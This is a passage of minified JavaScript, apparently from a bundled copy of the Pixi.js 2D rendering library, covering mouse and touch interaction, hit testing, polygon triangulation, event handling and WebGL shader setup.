        this.stage = t, this.mouse = new e.InteractionData, this.touches = {}, this.tempPoint = new e.Point, this.mouseoverEnabled = !0, this.pool = [], this.interactiveItems = [], this.interactionDOMElement = null, this.onMouseMove = this.onMouseMove.bind(this), this.onMouseDown = this.onMouseDown.bind(this), this.onMouseOut = this.onMouseOut.bind(this), this.onMouseUp = this.onMouseUp.bind(this), this.onTouchStart = this.onTouchStart.bind(this), this.onTouchEnd = this.onTouchEnd.bind(this), this.onTouchMove = this.onTouchMove.bind(this), this.last = 0, this.currentCursorStyle = "inherit", this.mouseOut = !1, this._tempPoint = new e.Point
    }, e.InteractionManager.prototype.constructor = e.InteractionManager, e.InteractionManager.prototype.collectInteractiveSprite = function(e, t) {
        for (var i = e.children, n = i.length - 1; n >= 0; n--) {
            var r = i[n];
            r._interactive ? (t.interactiveChildren = !0, this.interactiveItems.push(r), r.children.length > 0 && this.collectInteractiveSprite(r, r)) : (r.__iParent = null, r.children.length > 0 && this.collectInteractiveSprite(r, t))
        }
    }, e.InteractionManager.prototype.setTarget = function(e) {
        this.target = e, null === this.interactionDOMElement && this.setTargetDomElement(e.view)
    }, e.InteractionManager.prototype.setTargetDomElement = function(e) {
        this.removeEvents(), window.navigator.msPointerEnabled && (e.style["-ms-content-zooming"] = "none", e.style["-ms-touch-action"] = "none"), this.interactionDOMElement = e, e.addEventListener("mousemove", this.onMouseMove, !0), e.addEventListener("mousedown", this.onMouseDown, !0), e.addEventListener("mouseout", this.onMouseOut, !0), e.addEventListener("touchstart", this.onTouchStart, !0), e.addEventListener("touchend", this.onTouchEnd, !0), e.addEventListener("touchmove", this.onTouchMove, !0), window.addEventListener("mouseup", this.onMouseUp, !0)
    }, e.InteractionManager.prototype.removeEvents = function() {
        this.interactionDOMElement && (this.interactionDOMElement.style["-ms-content-zooming"] = "", this.interactionDOMElement.style["-ms-touch-action"] = "", this.interactionDOMElement.removeEventListener("mousemove", this.onMouseMove, !0), this.interactionDOMElement.removeEventListener("mousedown", this.onMouseDown, !0), this.interactionDOMElement.removeEventListener("mouseout", this.onMouseOut, !0), this.interactionDOMElement.removeEventListener("touchstart", this.onTouchStart, !0), this.interactionDOMElement.removeEventListener("touchend", this.onTouchEnd, !0), this.interactionDOMElement.removeEventListener("touchmove", this.onTouchMove, !0), this.interactionDOMElement = null, window.removeEventListener("mouseup", this.onMouseUp, !0))
    }, e.InteractionManager.prototype.update = function() {
        if (this.target) {
            var t = Date.now(),
                i = t - this.last;
            if (!((i = i * e.INTERACTION_FREQUENCY / 1e3) < 1)) {
                this.last = t;
                var n = 0;
                this.dirty && this.rebuildInteractiveGraph();
                var r = this.interactiveItems.length,
                    o = "inherit",
                    a = !1;
                for (n = 0; n < r; n++) {
                    var s = this.interactiveItems[n];
                    s.__hit = this.hitTest(s, this.mouse), this.mouse.target = s, s.__hit && !a ? (s.buttonMode && (o = s.defaultCursor), s.interactiveChildren || (a = !0), s.__isOver || (s.mouseover && s.mouseover(this.mouse), s.__isOver = !0)) : s.__isOver && (s.mouseout && s.mouseout(this.mouse), s.__isOver = !1)
                }
                this.currentCursorStyle === o || XS.ignoreCursorChanges || (this.currentCursorStyle = o, this.interactionDOMElement.style.cursor = o)
            }
        }
    }, e.InteractionManager.prototype.rebuildInteractiveGraph = function() {
        this.dirty = !1;
        for (var e = this.interactiveItems.length, t = 0; t < e; t++) this.interactiveItems[t].interactiveChildren = !1;
        this.interactiveItems = [], this.stage.interactive && this.interactiveItems.push(this.stage), this.collectInteractiveSprite(this.stage, this.stage)
    }, e.InteractionManager.prototype.onMouseMove = function(e) {
        if (this.dirty && this.rebuildInteractiveGraph(), this.mouse) {
            this.mouse.originalEvent = e;
            var t = this.interactionDOMElement.getBoundingClientRect();
            this.mouse.global.x = (e.clientX - t.left) * (this.target.width / t.width), this.mouse.global.y = (e.clientY - t.top) * (this.target.height / t.height);
            for (var i = this.interactiveItems.length, n = 0; n < i; n++) {
                var r = this.interactiveItems[n];
                r.mousemove && r.mousemove(this.mouse)
            }
        }
    }, e.InteractionManager.prototype.onMouseDown = function(t) {
        if (this.dirty && this.rebuildInteractiveGraph(), this.mouse) {
            this.mouse.originalEvent = t, e.AUTO_PREVENT_DEFAULT && this.mouse.originalEvent && this.mouse.originalEvent.preventDefault();
            for (var i = this.interactiveItems.length, n = this.mouse.originalEvent, r = 2 === n.button || 3 === n.which, o = r ? "rightdown" : "mousedown", a = r ? "rightclick" : "__click", s = r ? "__rightIsDown" : "__mouseIsDown", l = r ? "__isRightDown" : "__isDown", h = 0; h < i; h++) {
                var d = this.interactiveItems[h];
                if ((d[o] || d[a]) && (d[s] = !0, d.__hit = this.hitTest(d, this.mouse), d.__hit && (d[o] && d[o](this.mouse), d[l] = !0, !d.interactiveChildren))) break
            }
        }
    }, e.InteractionManager.prototype.onMouseOut = function(e) {
        if (this.dirty && this.rebuildInteractiveGraph(), this.mouse) {
            this.mouse.originalEvent = e;
            var t = this.interactiveItems.length;
            this.interactionDOMElement.style.cursor = "inherit";
            for (var i = 0; i < t; i++) {
                var n = this.interactiveItems[i];
                n.__isOver && (this.mouse.target = n, n.mouseout && n.mouseout(this.mouse), n.__isOver = !1)
            }
            this.mouseOut = !0
        }
    }, e.InteractionManager.prototype.onMouseUp = function(e) {
        if (this.dirty && this.rebuildInteractiveGraph(), this.mouse) {
            this.mouse.originalEvent = e;
            for (var t = this.interactiveItems.length, i = !1, n = this.mouse.originalEvent, r = 2 === n.button || 3 === n.which, o = r ? "rightup" : "mouseup", a = r ? "rightclick" : "__click", s = r ? "rightupoutside" : "mouseupoutside", l = r ? "__isRightDown" : "__isDown", h = 0; h < t; h++) {
                var d = this.interactiveItems[h];
                (d[a] || d[o] || d[s]) && (d.__hit = this.hitTest(d, this.mouse), d.__hit && !i ? (d[o] && d[o](this.mouse), d[l] && d[a] && d[a](this.mouse), d.interactiveChildren || (i = !0)) : d[l] && d[s] && d[s](this.mouse), d[l] = !1)
            }
        }
    }, e.InteractionManager.prototype.hitTest = function(t, i) {
        var n = i.global;
        if (!t.worldVisible) return !1;
        t.worldTransform.applyInverse(n, this._tempPoint);
        var r, o = this._tempPoint.x,
            a = this._tempPoint.y;
        if (i.target = t, t.hitArea && t.hitArea.contains) return t.hitArea.contains(o, a);
        if (t instanceof e.Sprite) {
            var s, l = t.texture.frame.width,
                h = t.texture.frame.height,
                d = -l * t.anchor.x;
            if (o > d && o < d + l && a > (s = -h * t.anchor.y) && a < s + h) return !0
        } else if (t instanceof e.Graphics) {
            var c = t.graphicsData;
            for (r = 0; r < c.length; r++) {
                var u = c[r];
                if (u.fill && (u.shape && u.shape.contains(o, a))) return !0
            }
        }
        var f = t.children.length;
        for (r = 0; r < f; r++) {
            var p = t.children[r];
            if (this.hitTest(p, i)) return i.target = t, !0
        }
        return !1
    }, e.InteractionManager.prototype.onTouchMove = function(e) {
        this.dirty && this.rebuildInteractiveGraph();
        var t, i = this.interactionDOMElement.getBoundingClientRect(),
            n = e.changedTouches,
            r = 0;
        for (r = 0; r < n.length; r++) {
            var o = n[r];
            if (t = this.touches[o.identifier]) {
                t.originalEvent = e, t.global.x = (o.clientX - i.left) * (this.target.width / i.width), t.global.y = (o.clientY - i.top) * (this.target.height / i.height);
                for (var a = 0; a < this.interactiveItems.length; a++) {
                    var s = this.interactiveItems[a];
                    s.touchmove && s.__touchData && s.__touchData[o.identifier] && s.touchmove(t)
                }
            }
        }
        e.preventDefault()
    }, e.InteractionManager.prototype.onTouchStart = function(t) {
        this.dirty && this.rebuildInteractiveGraph();
        var i = this.interactionDOMElement.getBoundingClientRect();
        e.AUTO_PREVENT_DEFAULT && t.preventDefault();
        for (var n = t.changedTouches, r = 0; r < n.length; r++) {
            var o = n[r],
                a = this.pool.pop();
            a || (a = new e.InteractionData), a.originalEvent = t, this.touches[o.identifier] = a, a.global.x = (o.clientX - i.left) * (this.target.width / i.width), a.global.y = (o.clientY - i.top) * (this.target.height / i.height);
            for (var s = this.interactiveItems.length, l = 0; l < s; l++) {
                var h = this.interactiveItems[l];
                if ((h.touchstart || h.tap) && (h.__hit = this.hitTest(h, a), h.__hit && (h.touchstart && h.touchstart(a), h.__isDown = !0, h.__touchData = h.__touchData || {}, h.__touchData[o.identifier] = a, !h.interactiveChildren))) break
            }
        }
    }, e.InteractionManager.prototype.onTouchEnd = function(e) {
        this.dirty && this.rebuildInteractiveGraph();
        for (var t = this.interactionDOMElement.getBoundingClientRect(), i = e.changedTouches, n = 0; n < i.length; n++) {
            var r = i[n],
                o = this.touches[r.identifier];
            if (o) {
                var a = !1;
                o.global.x = (r.clientX - t.left) * (this.target.width / t.width), o.global.y = (r.clientY - t.top) * (this.target.height / t.height);
                for (var s = this.interactiveItems.length, l = 0; l < s; l++) {
                    var h = this.interactiveItems[l];
                    h.__touchData && h.__touchData[r.identifier] && (h.__hit = this.hitTest(h, h.__touchData[r.identifier]), o.originalEvent = e, (h.touchend || h.tap) && (h.__hit && !a ? (h.touchend && h.touchend(o), h.__isDown && h.tap && h.tap(o), h.interactiveChildren || (a = !0)) : h.__isDown && h.touchendoutside && h.touchendoutside(o), h.__isDown = !1), h.__touchData[r.identifier] = null)
                }
                this.pool.push(o), this.touches[r.identifier] = null
            }
        }
    }, e.Stage = function(t) {
        e.DisplayObjectContainer.call(this), this.worldTransform = new e.Matrix, this.interactive = !0, this.interactionManager = new e.InteractionManager(this), this.dirty = !0, this.stage = this, this.stage.hitArea = new e.Rectangle(0, 0, 1e5, 1e5), this.setBackgroundColor(t)
    }, e.Stage.prototype = Object.create(e.DisplayObjectContainer.prototype), e.Stage.prototype.constructor = e.Stage, e.Stage.prototype.updateTransform = function() {
        this.worldAlpha = 1;
        for (var e = 0, t = this.children.length; e < t; e++) this.children[e].updateTransform();
        this.dirty && (this.dirty = !1, this.interactionManager.dirty = !0), this.interactive && this.interactionManager.update()
    }, e.Stage.prototype.setBackgroundColor = function(t) {
        this.backgroundColor = t || 0, this.backgroundColorSplit = e.hex2rgb(this.backgroundColor);
        var i = this.backgroundColor.toString(16);
        i = "000000".substr(0, 6 - i.length) + i, this.backgroundColorString = "#" + i
    }, e.Stage.prototype.getMousePosition = function() {
        return this.interactionManager.mouse.global
    }, e.hex2rgb = function(e) {
        return [(e >> 16 & 255) / 255, (e >> 8 & 255) / 255, (255 & e) / 255]
    }, e.rgb2hex = function(e) {
        return (255 * e[0] << 16) + (255 * e[1] << 8) + 255 * e[2]
    }, e.canUseNewCanvasBlendModes = function() {
        if ("undefined" == typeof document) return !1;
        var e = document.createElement("canvas");
        e.width = 1, e.height = 1;
        var t = e.getContext("2d");
        return t.fillStyle = "#000", t.fillRect(0, 0, 1, 1), t.globalCompositeOperation = "multiply", t.fillStyle = "#fff", t.fillRect(0, 0, 1, 1), 0 === t.getImageData(0, 0, 1, 1).data[0]
    }, e.getNextPowerOfTwo = function(e) {
        if (e > 0 && 0 == (e & e - 1)) return e;
        for (var t = 1; t < e;) t <<= 1;
        return t
    }, e.isPowerOfTwo = function(e, t) {
        return e > 0 && 0 == (e & e - 1) && t > 0 && 0 == (t & t - 1)
    }, e.PolyK = {}, e.PolyK.Triangulate = function(t) {
        var i = !0,
            n = t.length >> 1;
        if (n < 3) return [];
        for (var r = [], o = [], a = 0; a < n; a++) o.push(a);
        a = 0;
        for (var s = n; s > 3;) {
            var l = o[(a + 0) % s],
                h = o[(a + 1) % s],
                d = o[(a + 2) % s],
                c = t[2 * l],
                u = t[2 * l + 1],
                f = t[2 * h],
                p = t[2 * h + 1],
                g = t[2 * d],
                v = t[2 * d + 1],
                m = !1;
            if (e.PolyK._convex(c, u, f, p, g, v, i)) {
                m = !0;
                for (var y = 0; y < s; y++) {
                    var w = o[y];
                    if (w !== l && w !== h && w !== d && e.PolyK._PointInTriangle(t[2 * w], t[2 * w + 1], c, u, f, p, g, v)) {
                        m = !1;
                        break
                    }
                }
            }
            if (m) r.push(l, h, d), o.splice((a + 1) % s, 1), s--, a = 0;
            else if (a++ > 3 * s) {
                if (!i) return null;
                for (r = [], o = [], a = 0; a < n; a++) o.push(a);
                a = 0, s = n, i = !1
            }
        }
        return r.push(o[0], o[1], o[2]), r
    }, e.PolyK._PointInTriangle = function(e, t, i, n, r, o, a, s) {
        var l = a - i,
            h = s - n,
            d = r - i,
            c = o - n,
            u = e - i,
            f = t - n,
            p = l * l + h * h,
            g = l * d + h * c,
            v = l * u + h * f,
            m = d * d + c * c,
            y = d * u + c * f,
            w = 1 / (p * m - g * g),
            S = (m * v - g * y) * w,
            x = (p * y - g * v) * w;
        return S >= 0 && x >= 0 && S + x < 1
    }, e.PolyK._convex = function(e, t, i, n, r, o, a) {
        return (t - n) * (r - i) + (i - e) * (o - n) >= 0 === a
    }, e.EventTarget = {
        call: function(t) {
            t && (t = t.prototype || t, e.EventTarget.mixin(t))
        },
        mixin: function(t) {
            t.listeners = function(e) {
                return this._listeners = this._listeners || {}, this._listeners[e] ? this._listeners[e].slice() : []
            }, t.emitPixi = t.dispatchEvent = function(t, i) {
                if (this._listeners = this._listeners || {}, "object" == typeof t && (i = t, t = t.type), i && !0 === i.__isEventObject || (i = new e.Event(this, t, i)), this._listeners && this._listeners[t]) {
                    var n, r = this._listeners[t].slice(0),
                        o = r.length,
                        a = r[0];
                    for (n = 0; n < o; a = r[++n])
                        if (a.call(this, i), i.stoppedImmediate) return this;
                    if (i.stopped) return this
                }
                return this.parent && this.parent.emit && this.parent.emit.call(this.parent, t, i), this
            }, t.onPixi = t.addEventListener = function(e, t) {
                return this._listeners = this._listeners || {}, (this._listeners[e] = this._listeners[e] || []).push(t), this
            }, t.oncePixi = function(e, t) {
                this._listeners = this._listeners || {};
                var i = this;

                function n() {
                    t.apply(i.offPixi(e, n), arguments)
                }
                return n._originalHandler = t, this.onPixi(e, n)
            }, t.offPixi = t.removeEventListener = function(e, t) {
                if (this._listeners = this._listeners || {}, !this._listeners[e]) return this;
                for (var i = this._listeners[e], n = t ? i.length : 0; n-- > 0;) i[n] !== t && i[n]._originalHandler !== t || i.splice(n, 1);
                return 0 === i.length && delete this._listeners[e], this
            }, t.removeAllListeners = function(e) {
                return this._listeners = this._listeners || {}, this._listeners[e] ? (delete this._listeners[e], this) : this
            }
        }
    }, e.Event = function(e, t, i) {
        this.__isEventObject = !0, this.stopped = !1, this.stoppedImmediate = !1, this.target = e, this.type = t, this.data = i, this.content = i, this.timeStamp = Date.now()
    }, e.Event.prototype.stopPropagation = function() {
        this.stopped = !0
    }, e.Event.prototype.stopImmediatePropagation = function() {
        this.stoppedImmediate = !0
    }, e.autoDetectRenderer = function(t, i, n) {
        return t || (t = 800), i || (i = 600),
            function() {
                try {
                    var e = n.view || document.createElement("canvas"),
                        t = {
                            alpha: n.transparent,
                            antialias: n.antialias,
                            premultipliedAlpha: n.transparent && "notMultiplied" !== n.transparent,
                            stencil: !0,
                            preserveDrawingBuffer: n.preserveDrawingBuffer
                        };
                    return !!window.WebGLRenderingContext && e.getContext("webgl", t)
                } catch (e) {
                    return console.warn("Failed to create WebGL renderer", e), !1
                }
            }() ? new e.WebGLRenderer(t, i, n) : (ga("send", "event", "WebGL", "Failed to create WebGL Context"), new e.CanvasRenderer(t, i, n))
    }, e.initDefaultShaders = function() {}, e.CompileVertexShader = function(t, i) {
        return e._CompileShader(t, i, t.VERTEX_SHADER)
    }, e.CompileFragmentShader = function(t, i) {
        return e._CompileShader(t, i, t.FRAGMENT_SHADER)
    }, e._CompileShader = function(e, t, i) {
        var n = t.join("\n"),
            r = e.createShader(i);
        return e.shaderSource(r, n), e.compileShader(r), e.getShaderParameter(r, e.COMPILE_STATUS) ? r : (window.console.log(e.getShaderInfoLog(r)), null)
    }, e.compileProgram = function(t, i, n) {
        var r = e.CompileFragmentShader(t, n),
            o = e.CompileVertexShader(t, i),
            a = t.createProgram();
        return t.attachShader(a, o), t.attachShader(a, r), t.linkProgram(a), t.getProgramParameter(a, t.LINK_STATUS) || window.console.log("Could not initialise shaders"), a
    }, e.PixiShader = function(t) {
        this._UID = e._UID++, this.gl = t, this.program = null, this.fragmentSrc = ["precision lowp float;", "varying vec2 vTextureCoord;", "varying vec4 vColor;", "uniform sampler2D uSampler;", "void main(void) {", "   gl_FragColor = texture2D(uSampler, vTextureCoord) * vColor ;", "}"], this.textureCount = 0, this.firstRun = !0, this.dirty = !0, this.attributes = [], this.init()
    }, e.PixiShader.prototype.constructor = e.PixiShader, e.PixiShader.prototype.init = function() {
        var t = this.gl,
            i = e.compileProgram(t, this.vertexSrc || e.PixiShader.defaultVertexSrc, this.fragmentSrc);
        for (var n in t.useProgram(i), this.uSampler = t.getUniformLocation(i, "uSampler"), this.projectionVector = t.getUniformLocation(i, "projectionVector"), this.offsetVector = t.getUniformLocation(i, "offsetVector"), this.dimensions = t.getUniformLocation(i, "dimensions"), this.aVertexPosition = t.getAttribLocation(i, "aVertexPosition"), this.aTextureCoord = t.getAttribLocation(i, "aTextureCoord"), this.colorAttribute = t.getAttribLocation(i, "aColor"), -1 === this.colorAttribute && (this.colorAttribute = 2), this.attributes = [this.aVertexPosition, this.aTextureCoord, this.colorAttribute], this.uniforms) this.uniforms[n].uniformLocation = t.getUniformLocation(i, n);
        this.initUniforms(), this.program = i
    }, e.PixiShader.prototype.initUniforms = function() {
        this.textureCount = 1;
        var e, t = this.gl;
        for (var i in this.uniforms) {
            var n = (e = this.uniforms[i]).type;
            "sampler2D" === n ? (e._init = !1, null !== e.value && this.initSampler2D(e)) : "mat2" === n || "mat3" === n || "mat4" === n ? (e.glMatrix = !0, e.glValueLength = 1, "mat2" === n ? e.glFunc = t.uniformMatrix2fv : "mat3" === n ? e.glFunc = t.uniformMatrix3fv : "mat4" === n && (e.glFunc = t.uniformMatrix4fv)) : (e.glFunc = t["uniform" + n], e.glValueLength = "2f" === n || "2i" === n ? 2 : "3f" === n || "3i" === n ? 3 : "4f" === n || "4i" === n ? 4 : 1)
        }
    }, e.PixiShader.prototype.initSampler2D = function(e) {
        if (e.value && e.value.baseTexture && e.value.baseTexture.hasLoaded) {
            var t = this.gl;
            if (t.activeTexture(t["TEXTURE" + this.textureCount]), t.bindTexture(t.TEXTURE_2D, e.value.baseTexture._glTextures[t.id]), e.textureData) {
                var i = e.textureData,
                    n = i.magFilter ? i.magFilter : t.LINEAR,
                    r = i.minFilter ? i.minFilter : t.LINEAR,
                    o = i.wrapS ? i.wrapS : t.CLAMP_TO_EDGE,
                    a = i.wrapT ? i.wrapT : t.CLAMP_TO_EDGE,
                    s = i.luminance ? t.LUMINANCE : t.RGBA;
                if (i.repeat && (o = t.REPEAT, a = t.REPEAT), t.pixelStorei(t.UNPACK_FLIP_Y_WEBGL, !!i.flipY), i.width) {
                    var l = i.width ? i.width : 512,
                        h = i.height ? i.height : 2,
                        d = i.border ? i.border : 0;
                    t.texImage2D(t.TEXTURE_2D, 0, s, l, h, d, s, t.UNSIGNED_BYTE, null)
                } else t.texImage2D(t.TEXTURE_2D, 0, s, t.RGBA, t.UNSIGNED_BYTE, e.value.baseTexture.source);
                t.texParameteri(t.TEXTURE_2D, t.TEXTURE_MAG_FILTER, n), t.texParameteri(t.TEXTURE_2D, t.TEXTURE_MIN_FILTER, r), t.texParameteri(t.TEXTURE_2D, t.TEXTURE_WRAP_S, o), t.texParameteri(t.TEXTURE_2D, t.TEXTURE_WRAP_T, a)
            }
            t.uniform1i(e.uniformLocation, this.textureCount), e._init = !0, this.textureCount++
        }
    }, e.PixiShader.prototype.syncUniforms = function() {
        var t;
        this.textureCount = 1;
        var i = this.gl;
        for (var n in this.uniforms) 1 === (t = this.uniforms[n]).glValueLength ? !0 === t.glMatrix ? t.glFunc.call(i, t.uniformLocation, t.transpose, t.value) : t.glFunc.call(i, t.uniformLocation, t.value) : 2 === t.glValueLength ? t.glFunc.call(i, t.uniformLocation, t.value.x, t.value.y) : 3 === t.glValueLength ? t.glFunc.call(i, t.uniformLocation, t.value.x, t.value.y, t.value.z) : 4 === t.glValueLength ? t.glFunc.call(i, t.uniformLocation, t.value.x, t.value.y, t.value.z, t.value.w) : "sampler2D" === t.type && (t._init ? (i.activeTexture(i["TEXTURE" + this.textureCount]), t.value.baseTexture._dirty[i.id] ? e.instances[i.id].updateTexture(t.value.baseTexture) : i.bindTexture(i.TEXTURE_2D, t.value.baseTexture._glTextures[i.id]), i.uniform1i(t.uniformLocation, this.textureCount), this.textureCount++) : this.initSampler2D(t))
    }, e.PixiShader.prototype.destroy = function() {
        this.gl.deleteProgram(this.program), this.uniforms = null, this.gl = null, this.attributes = null
    }, e.PixiShader.defaultVertexSrc = ["attribute vec2 aVertexPosition;", "attribute vec2 aTextureCoord;", "attribute vec4 aColor;", "uniform vec2 projectionVector;", "uniform vec2 offsetVector;", "varying vec2 vTextureCoord;", "varying vec4 vColor;", "const vec2 center = vec2(-1.0, 1.0);", "void main(void) {", "   gl_Position = vec4( ((aVertexPosition + offsetVector) / projectionVector) + center , 0.0, 1.0);", "   vTextureCoord = aTextureCoord;", "   vColor = vec4(aColor.rgb * aColor.a, aColor.a);", "}"], e.PixiFastShader = function(t) {
        this._UID = e._UID++, this.gl = t, this.program = null, this.fragmentSrc = ["precision lowp float;", "varying vec2 vTextureCoord;", "varying float vColor;", "uniform sampler2D uSampler;", "void main(void) {", "   gl_FragColor = texture2D(uSampler, vTextureCoord) * vColor ;", "}"], this.vertexSrc = ["attribute vec2 aVertexPosition;", "attribute vec2 aPositionCoord;", "attribute vec2 aScale;", "attribute float aRotation;", "attribute vec2 aTextureCoord;", "attribute float aColor;", "uniform vec2 projectionVector;", "uniform vec2 offsetVector;", "uniform mat3 uMatrix;", "varying vec2 vTextureCoord;", "varying float vColor;", "const vec2 center = vec2(-1.0, 1.0);", "void main(void) {", "   vec2 v;", "   vec2 sv = aVertexPosition * aScale;", "   v.x = (sv.x) * cos(aRotation) - (sv.y) * sin(aRotation);", "   v.y = (sv.x) * sin(aRotation) + (sv.y) * cos(aRotation);", "   v = ( uMatrix * vec3(v + aPositionCoord , 1.0) ).xy ;", "   gl_Position = vec4( ( v / projectionVector) + center , 0.0, 1.0);", "   vTextureCoord = aTextureCoord;", "   vColor = aColor;", "}"], this.textureCount = 0, this.init()
    }, e.PixiFastShader.prototype.constructor = e.PixiFastShader, e.PixiFastShader.prototype.init = function() {
        var t = this.gl,
            i = e.compileProgram(t, this.vertexSrc, this.fragmentSrc);
        t.useProgram(i), this.uSampler = t.getUniformLocation(i, "uSampler"), this.projectionVector = t.getUniformLocation(i, "projectionVector"), this.offsetVector = t.getUniformLocation(i, "offsetVector"), this.dimensions = t.getUniformLocation(i, "dimensions"), this.uMatrix = t.getUniformLocation(i, "uMatrix"), this.aVertexPosition = t.getAttribLocation(i, "aVertexPosition"), this.aPositionCoord = t.getAttribLocation(i, "aPositionCoord"), this.aScale = t.getAttribLocation(i, "aScale"), this.aRotation = t.getAttribLocation(i, "aRotation"), this.aTextureCoord = t.getAttribLocation(i, "aTextureCoord"), this.colorAttribute = t.getAttribLocation(i, "aColor"), -1 === this.colorAttribute && (this.colorAttribute = 2), this.attributes = [this.aVertexPosition, this.aPositionCoord, this.aScale, this.aRotation, this.aTextureCoord, this.colorAttribute], this.program = i
    }, e.PixiFastShader.prototype.destroy = function() {
        this.gl.deleteProgram(this.program), this.uniforms = null, this.gl = null, this.attributes = null
    }, e.PrimitiveShader = function(t) {
        this._UID = e._UID++, this.gl = t, this.program = null, this.fragmentSrc = ["precision mediump float;", "varying vec4 vColor;", "void main(void) {", "   gl_FragColor = vColor;", "}"], this.vertexSrc = ["attribute vec2 aVertexPosition;", "attribute vec4 aColor;", "uniform mat3 translationMatrix;", "uniform vec2 projectionVector;", "uniform vec2 offsetVector;", "uniform float alpha;", "uniform float flipY;", "uniform vec3 tint;", "varying vec4 vColor;", "void main(void) {", "   vec3 v = translationMatrix * vec3(aVertexPosition , 1.0);", "   v -= offsetVector.xyx;", "   gl_Position = vec4( v.x / projectionVector.x -1.0, (v.y / projectionVector.y * -flipY) + flipY , 0.0, 1.0);", "   vColor = aColor * vec4(tint * alpha, alpha);", "}"], this.init()
    }, e.PrimitiveShader.prototype.constructor = e.PrimitiveShader, e.PrimitiveShader.prototype.init = function() {
        var t = this.gl,
            i = e.compileProgram(t, this.vertexSrc, this.fragmentSrc);
        t.useProgram(i), this.projectionVector = t.getUniformLocation(i, "projectionVector"), this.offsetVector = t.getUniformLocation(i, "offsetVector"), this.tintColor = t.getUniformLocation(i, "tint"), this.flipY = t.getUniformLocation(i, "flipY"), this.aVertexPosition = t.getAttribLocation(i, "aVertexPosition"), this.colorAttribute = t.getAttribLocation(i, "aColor"), this.attributes = [this.aVertexPosition, this.colorAttribute], this.translationMatrix = t.getUniformLocation(i, "translationMatrix"), this.alpha = t.getUniformLocation(i, "alpha"), this.program = i
    }, e.PrimitiveShader.prototype.destroy = function() {
        this.gl.deleteProgram(this.program), this.uniforms = null, this.gl = null, this.attributes = null
    }, e.ComplexPrimitiveShader = function(t) {
        this._UID = e._UID++, this.gl = t, this.program = null, this.fragmentSrc = ["precision mediump float;", "varying vec4 vColor;", "void main(void) {", "   gl_FragColor = vColor;", "}"], this.vertexSrc = ["attribute vec2 aVertexPosition;", "uniform mat3 translationMatrix;", "uniform vec2 projectionVector;", "uniform vec2 offsetVector;", "uniform vec3 tint;", "uniform float alpha;", "uniform vec3 color;", "uniform float flipY;", "varying vec4 vColor;", "void main(void) {", "   vec3 v = translationMatrix * vec3(aVertexPosition , 1.0);", "   v -= offsetVector.xyx;", "   gl_Position = vec4( v.x / projectionVector.x -1.0, (v.y / projectionVector.y * -flipY) + flipY , 0.0, 1.0);", "   vColor = vec4(color * alpha * tint, alpha);", "}"], this.init()
    }, e.ComplexPrimitiveShader.prototype.constructor = e.ComplexPrimitiveShader, e.ComplexPrimitiveShader.prototype.init = function() {
        var t = this.gl,
            i = e.compileProgram(t, this.vertexSrc, this.fragmentSrc);
        t.useProgram(i), this.projectionVector = t.getUniformLocation(i, "projectionVector"), this.offsetVector = t.getUniformLocation(i, "offsetVector"), this.tintColor = t.getUniformLocation(i, "tint"), this.color = t.getUniformLocation(i, "color"), this.flipY = t.getUniformLocation(i, "flipY"), this.aVertexPosition = t.getAttribLocation(i, "aVertexPosition"), this.attributes = [this.aVertexPosition, this.colorAttribute], this.translationMatrix = t.getUniformLocation(i, "translationMatrix"), this.alpha = t.getUniformLocation(i, "alpha"), this.program = i
    }, e.ComplexPrimitiveShader.prototype.destroy = function() {
        this.gl.deleteProgram(this.program), this.uniforms = null, this.gl = null, this.attribute = null
    }, e.WebGLGraphics = function() {}, e.WebGLGraphics.renderGraphics = function(t, i) {
        var n, r = i.gl,
            o = i.projection,
            a = i.offset,
            s = i.shaderManager.primitiveShader;
        t.dirty && e.WebGLGraphics.updateGraphics(t, r);
        var l = t._webGL[r.id];
        if (l && l.data)
            for (var h = 0; h < l.data.length; h++) 1 === l.data[h].mode ? (n = l.data[h], i.stencilManager.pushStencil(t, n, i), r.drawElements(r.TRIANGLE_FAN, 4, r.UNSIGNED_SHORT, 2 * (n.indices.length - 4)), i.stencilManager.popStencil(t, n, i)) : (n = l.data[h], i.shaderManager.setShader(s), s = i.shaderManager.primitiveShader, r.uniformMatrix3fv(s.translationMatrix, !1, t.worldTransform.toArray(!0)), r.uniform1f(s.flipY, 1), r.uniform2f(s.projectionVector, o.x, -o.y), r.uniform2f(s.offsetVector, -a.x, -a.y), r.uniform3fv(s.tintColor, e.hex2rgb(t.tint)), r.uniform1f(s.alpha, t.worldAlpha), r.bindBuffer(r.ARRAY_BUFFER, n.buffer), r.vertexAttribPointer(s.aVertexPosition, 2, r.FLOAT, !1, 24, 0), r.vertexAttribPointer(s.colorAttribute, 4, r.FLOAT, !1, 24, 8), r.bindBuffer(r.ELEMENT_ARRAY_BUFFER, n.indexBuffer), r.drawElements(r.TRIANGLE_STRIP, n.indices.length, r.UNSIGNED_SHORT, 0))
    }, e.WebGLGraphics.updateGraphics = function(t, i) {
        var n, r, o = t._webGL[i.id];
        if (o || (o = t._webGL[i.id] = {
                lastIndex: 0,
                data: [],
                gl: i
            }), t.dirty = !1, t.clearDirty) {
            for (t.clearDirty = !1, n = 0; n < o.data.length; n++) {
                var a = o.data[n];
                a.reset(), e.WebGLGraphics.graphicsDataPool.push(a)
            }
            o.data = [], o.lastIndex = 0
        }
        for (n = o.lastIndex; n < t.graphicsData.length; n++) {
            var s = t.graphicsData[n];
            if (s.type === e.Graphics.POLY) {
                if (s.points = s.shape.points.slice(), s.shape.closed && (s.points[0] === s.points[s.points.length - 2] && s.points[1] === s.points[s.points.length - 1] || s.points.push(s.points[0], s.points[1])), s.fill)
                    if (s.points.length >= 6)
                        if (s.points.length < 12) r = e.WebGLGraphics.switchMode(o, 0), e.WebGLGraphics.buildPoly(s, r) || (r = e.WebGLGraphics.switchMode(o, 1), e.WebGLGraphics.buildComplexPoly(s, r));
                        else r = e.WebGLGraphics.switchMode(o, 1), e.WebGLGraphics.buildComplexPoly(s, r);
                s.lineWidth > 0 && (r = e.WebGLGraphics.switchMode(o, 0), e.WebGLGraphics.buildLine(s, r))
            } else r = e.WebGLGraphics.switchMode(o, 0), s.type === e.Graphics.RECT ? e.WebGLGraphics.buildRectangle(s, r) : s.type === e.Graphics.CIRC || s.type === e.Graphics.ELIP ? e.WebGLGraphics.buildCircle(s, r) : s.type === e.Graphics.RREC && e.WebGLGraphics.buildRoundedRectangle(s, r);
            o.lastIndex++
        }
        for (n = 0; n < o.data.length; n++)(r = o.data[n]).dirty && r.upload()
    }, e.WebGLGraphics.switchMode = function(t, i) {
        var n;
